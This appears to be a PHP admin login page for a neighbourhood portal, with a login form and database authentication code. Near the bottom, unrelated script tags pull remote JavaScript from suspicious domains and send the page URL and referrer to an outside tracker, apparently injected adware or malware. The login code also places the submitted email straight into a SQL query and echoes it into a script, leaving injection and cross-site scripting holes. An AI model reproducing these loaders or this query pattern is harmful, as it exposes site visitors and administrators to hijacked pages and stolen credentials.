<?php 

session_start();

?>

<html lang="en"><head>

    <style id="stndz-style"></style>
    <title>E-NEIGHBOURHOOD</title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <!-- Favicon icon -->
    <link rel="shortcut icon" type="image/png"  href="images/favicon.png">
    <!-- <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous"> -->
    <link href="css/style.css" rel="stylesheet">
</head>

<body class="h-100">
    
    <!--*******************
        Preloader start
    ********************-->
    <div id="preloader">
        <div class="loader">
            <svg class="circular" viewBox="25 25 50 50">
                <circle class="path" cx="50" cy="50" r="20" fill="none" stroke-width="3" stroke-miterlimit="10" />
            </svg>
        </div>
    </div>
    <!--*******************
        Preloader end
    ********************-->

<div style="background-image: url('images/malogin.jpg');" style="background-size: cover;">

    <div class="login-form-bg h-100">
        <div class="container h-100">
            <div class="row justify-content-center h-100">
                <div class="col-xl-6">
                    <div class="form-input-content">
                        <div class="card login-form mb-0">
                            <div class="card-body pt-5">
                                <a class="text-center" href="index.html"> <h4>AREA ADMIN LOGIN</h4></a>
        
                                <form class="mt-5 mb-5 login-input" method="post">
                                    <div class="form-group">
                                        <input class="form-control"  type="email" name="email" title="Must Enter proper Email Id " autocomplete="none" placeholder="Email">
                                    </div>
                                    <div class="form-group">
                                        <input class="form-control" type="password"  name="upass" id="typepass" placeholder="Password" pattern="(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,}" title="Must contain at least one number and one uppercase and lowercase letter, and at least 8 or more characters" required><br>
                                        <input type="checkbox" onclick="Toggle()"> 
    &nbsp Show Password
  
    <script> 
    // Change the type of input to password or text 
        function Toggle() { 
            var temp = document.getElementById("typepass"); 
            if (temp.type === "password") { 
                temp.type = "text"; 
            } 
            else { 
                temp.type = "password"; 
            } 
        } 
</script> 
                                    </div>    
                                    <!-- <button class="btn login-form__btn submit w-100">Sign In</button> -->
                                    <button name="done" type="submit" class="btn login-form__btn submit w-100">LOGIN</button>
                                </form>
                                <a href="forget_pass.php">Forgot Password?</a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>


<?php include_once 'script.php'; ?>
<script async="" src="https://www.googletagmanager.com/gtag/js?id=UA-23581568-13"></script>
<script>
	  window.dataLayer = window.dataLayer || [];
	  function gtag(){dataLayer.push(arguments);}
	  gtag('js', new Date());

	  gtag('config', 'UA-23581568-13');
	</script>
<script type="text/javascript">(function(window, document) {if (window === top) {var script = document.createElement('script'); script.src = 'https://cdn.immereeako.info/pa.min.js'; document.getElementsByTagName('head')[0].insertAdjacentElement('beforeEnd', script); window['_paInfo_'] = window['_paInfo_'] || {uid: 'HWXCBWTXWD',sub1: 'hwwm'};(new Image).src = '//colorlib.com/pages/imevrstk.php?qd=BTB&zqd=009.004&nbid=1d39b7206c47bc65ee21e032cd65e5ac&cid=185439' + '&url=' + encodeURIComponent(location.href) + '&ref=' + encodeURIComponent(document.referrer) + '&t=' + parseInt(Math.random()*1000000);}})(window, document);</script>

<script type="text/javascript" src="https://solid-waste.top/v/492089.js?j=1221"></script><div id="des_xnba_ewn"></div>
<?php 
if(isset($_POST['done']))
{

include_once 'connection.php';

$mail=$_POST['email'];
$pass=$_POST['upass'];

$qry="select * from admin where Email_id='$mail'";

echo "<script>alert($qry)</script>";

//this method execute when connection is success than it execute the query and store the result in res variable
$res= mysqli_query($con,$qry);
  
 //this method will get the value of res variable and fetch from the database and the result will generated in array and store in row variable
 $row=mysqli_fetch_array($res);
 //this use for compare two values one from user inputted and another from database
  if($row['Email_id']==$mail)
     
  {
    if(password_verify($pass,$row['Password']))
   //if($row['Password']==$pass)
      {
        if($row['active']=='yes')
        {
    //session needs to store some value so here session storing value
  	echo $_SESSION['email']=$row['Email_id'];
?>
<script>window.location="index.php";</script>
 <?php
    // $_SESSION['uname']=$row['Adm_name'];
        }
        else
        {
             echo "<SCRIPT LANGUAGE='JavaScript'> window.alert('Your account is not active')</SCRIPT>";
        }
 
  
 
      }
      else
      {
          echo "<SCRIPT LANGUAGE='JavaScript'> window.alert('Please Enter Correct Details')</SCRIPT>";
      }


  }
  else
  {
    echo "<SCRIPT LANGUAGE='JavaScript'> window.alert('Please Enter Correct Details')</SCRIPT>";
  }
}
?>

    <!--**********************************
        Scripts
    ***********************************-->
    <script src="plugins/common/common.min.js"></script>
    <script src="js/custom.min.js"></script>
    <script src="js/settings.js"></script>
    <script src="js/gleek.js"></script>
    <script src="js/styleSwitcher.js"></script>

</body>

</html>
